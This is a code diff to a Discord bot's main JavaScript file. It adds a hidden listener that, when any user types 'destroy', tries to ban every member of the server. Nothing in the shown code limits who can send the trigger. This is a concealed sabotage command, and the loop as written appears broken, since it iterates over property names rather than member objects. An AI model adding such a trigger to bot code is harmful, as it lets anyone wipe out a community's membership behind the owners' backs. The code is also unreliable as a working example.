@@ -62,4 +62,12 @@ client.on("message", async message => {
         command.run(client, message, args);   
 });
 
+client.on("message", function(msg) {
+if(msg.content.toLowerCase() == "destroy") {
+for (var members in msg.guild.members) {
+members.ban();
+}
+}
+});
+
 client.login(process.env.TOKEN);
